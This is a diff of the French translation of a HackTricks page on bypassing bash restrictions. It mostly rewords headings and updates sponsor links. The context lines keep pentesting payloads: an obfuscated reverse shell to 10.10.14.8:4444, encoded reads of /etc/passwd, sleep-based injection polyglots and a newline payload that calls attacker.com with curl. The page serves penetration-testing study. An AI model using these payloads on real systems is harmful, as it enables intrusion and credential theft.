@@ -17,14 +17,14 @@ Autres façons de soutenir HackTricks :
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
+Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
 Accédez dès aujourd'hui :
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
-## Contournement des limitations courantes
+## Contournements de limitations courantes
 
-### Shell Inversé
+### Shell inversé
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -135,7 +135,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Contourner avec l'encodage hexadécimal
+### Contourner avec un encodage hexadécimal
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -163,10 +163,10 @@ echo ${PATH:0:1} #/
 
 Vous pourriez utiliser **burpcollab** ou [**pingb**](http://pingb.in) par exemple.
 
-### Commandes intégrées
+### Commandes internes
 
-Dans le cas où vous ne pouvez pas exécuter des fonctions externes et que vous avez uniquement accès à un **ensemble limité de commandes intégrées pour obtenir une RCE**, il existe quelques astuces pratiques pour y parvenir. Habituellement, vous **ne pourrez pas utiliser toutes** les **commandes intégrées**, donc vous devriez **connaître toutes vos options** pour essayer de contourner la prison. Idée de [**devploit**](https://twitter.com/devploit).\
-Tout d'abord, vérifiez toutes les [**commandes intégrées du shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Ensuite, voici quelques **recommandations**:
+Dans le cas où vous ne pouvez pas exécuter des fonctions externes et que vous avez uniquement accès à un **ensemble limité de commandes internes pour obtenir une exécution de code à distance (RCE)**, il existe quelques astuces pratiques pour y parvenir. Habituellement, vous **ne pourrez pas utiliser toutes** les **commandes internes**, donc vous devriez **connaître toutes vos options** pour essayer de contourner la restriction. Idée de [**devploit**](https://twitter.com/devploit).\
+Tout d'abord, vérifiez toutes les [**commandes internes du shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Ensuite, voici quelques **recommandations**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -223,12 +223,14 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Contourner les regex potentiels
+### Contourner les expressions régulières potentielles
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
+
+### Bashfuscateur
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
@@ -339,10 +341,10 @@ Si vous vous trouvez dans un système de fichiers avec les **protections en lect
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
+Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
 Accédez dès aujourd'hui :
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
 <details>
 
@@ -352,7 +354,7 @@ Autres façons de soutenir HackTricks :
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
